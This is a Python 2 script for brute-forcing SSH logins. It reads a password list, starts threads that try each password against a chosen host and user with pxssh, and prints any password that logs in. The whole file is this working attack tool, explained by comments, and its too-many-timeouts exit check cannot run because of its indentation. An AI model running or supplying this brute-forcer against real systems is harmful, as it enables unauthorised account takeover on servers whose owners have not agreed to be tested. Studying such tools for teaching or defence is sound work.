import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value = maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release):
	# Make these variables global so the whole program can use them
	global Found
	global Fails
	try:
		# Define a pxssh object
		s = pxssh.pxssh()
		# Try to login using the specified arguments, if login succeeds then we've found the password
		s.login(host, user, password)
		print "[+] Password Found: " + password
		Found  = True
	except Exception, e:
		# Too many things happening at once, wait then try again
		if "read_nonblocking" in str(e):
			Fails += 1
			time.sleep(5)
			connect(host, user, password, False)
		elif "synchronize with original promp" in str(e):
			time.sleep(1)
			connect(host, user, password, False)
	finally:
		# Release the screen lock so something else can print to the screen
		if release: connection_lock.release()

def main():
	# Declare a option parser and give it a usage string to print out 
	parser = optparse.OptionParser("Usage: -H <target host> -U <user> -P <password list>")
	# Add options to the parser
	parser.add_option("-H", dest = "tgtHost", type = "string", help = "specify a target host")
	parser.add_option("-U", dest = "tgtUser", type = "string", help = "specify a target user")
	parser.add_option("-P", dest = "passwordFile", type = "string", help = "specify a target file")
	# Pass the options and arguments to the parser
	(options, args) = parser.parse_args()
	# Assign those arguments to local variables
	host = options.tgtHost
	passwordFile = options.passwordFile
	user = options.tgtUser
	# If there any of the options are blank print out the parsers usage string
	if host == None or passwordFile == None or user == None:
		print parser.usage
		exit(0)
	# Open the specified password file in read mode
	fn = open(passwordFile, "r")
	for line in fn.readlines():
	# For each line in the password file...
		if Found:
			print "[*] Existing Password Found"
			exit(0)
			if Fails > 5:
				print "[!] Exiting: Too Many Socket Timeouts"
				exit(0)
		# Acquire the screen lock so only one thing can print to the screen at a time
		connection_lock.acquire()
		# Strip away all the unneed characters from each line
		password = line.strip("\r").strip("\n")
		print "[-] Testing: " + str(password)
		# Create a Thread to speed up password testing. Tell it which Function to use and which arguments to give that Function
		t = Thread(target = connect, args = (host, user, password, True))
		# Start the Thread
		child = t.start()

if __name__ == "__main__":
	main()
